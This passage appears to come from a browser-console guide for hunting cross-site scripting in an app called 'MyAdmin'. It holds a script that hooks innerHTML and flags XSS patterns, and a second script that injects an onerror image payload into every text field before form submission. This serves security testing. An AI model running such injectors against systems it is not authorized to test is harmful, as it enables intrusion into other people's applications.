👀 Step 1: innerHTML Sink Detector

Hook innerHTML setter globally. Every time any script sets element.innerHTML = something, we log the element, the data, and the stack trace. 

// Copy this entire block → paste in MyAdmin Console → press Enter
const _origInnerHTML = Object.getOwnPropertyDescriptor(
  Element.prototype, 'innerHTML'
).set;

const _seen = new WeakSet();

Object.defineProperty(Element.prototype, 'innerHTML', {
  set: function(value) {
    // Skip our own injections
    if (value && typeof value === 'string' && value.length > 5) {
      const tag = this.tagName || '?';
      const preview = value.substring(0, 120);
      const stack = new Error().stack.split('\n').slice(1,5).join(' ← ');

      console.log(
        '%c[innerHTML] %c<' + tag + '> %c' + preview,
        'color:#ff0;font-weight:bold',
        'color:#0ff',
        'color:#fff'
      );
      console.log('%c  Stack: %c' + stack, 'color:#888', 'color:#aaa');

      // Detect XSS payloads
      if (/<script|<img|onerror=|onload=|javascript:|<iframe|<svg/i.test(value)) {
        console.log(
          '%c[!] XSS VECTOR DETECTED in <' + tag + '>!',
          'color:red;font-size:16px;font-weight:bold'
        );
        console.log('%c  Value: %c' + value.substring(0, 200), 'color:red', 'color:#f88');
      }
    }
    _origInnerHTML.call(this, value);
  },
  get: function() {
    return _origInnerHTML.call(this);
  },
  configurable: true
});

console.log('%c✓ innerHTML hook installed', 'color:lime;font-weight:bold');
console.log('%c  Now browse MyAdmin. Any innerHTML write will be logged.', 'color:#aaa');
console.log('%c  If you see [XSS VECTOR DETECTED] in red → you found a sink!', 'color:#ff0');

⚡ Step 5: Automated XSS Payload Injector

WARNING: This will inject XSS test payloads into ALL text fields on the current page. Only run this on pages where you want to test.

After running, submit each form and check if the payload renders as HTML. 

// Run in MyAdmin Console — injects test payload into every text field
const test = '<img src=x onerror="console.log(\'XSS_WORKS_\'+document.location.pathname)">';
const fields = document.querySelectorAll(
  'input[type="text"], input:not([type]), textarea, [contenteditable="true"]'
);
console.log('%cInjecting XSS test payload into ' + fields.length + ' fields...', 'color:#ff0');
fields.forEach((el, i) => {
  if (el.contentEditable === 'true') {
    el.innerHTML = test;
  } else {
    // Use native setter to trigger Angular's change detection
    const nativeSetter = Object.getOwnPropertyDescriptor(
      HTMLInputElement.prototype, 'value'
    ).set || Object.getOwnPropertyDescriptor(
      HTMLTextAreaElement.prototype, 'value'
    ).set;
    if (nativeSetter) {
      nativeSetter.call(el, test);
    } else {
      el.value = test;
    }
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
  }
  console.log('  [✓] ' + (el.name || el.id || el.tagName) + ' ← payload injected');
});

console.log('%c✓ All ' + fields.length + ' fields injected', 'color:lime;font-weight:bold');
console.log('%c  Now SUBMIT the form. If you see "XSS_WORKS_" in console → XSS confirmed!', 'color:#ff0;font-size:14px');
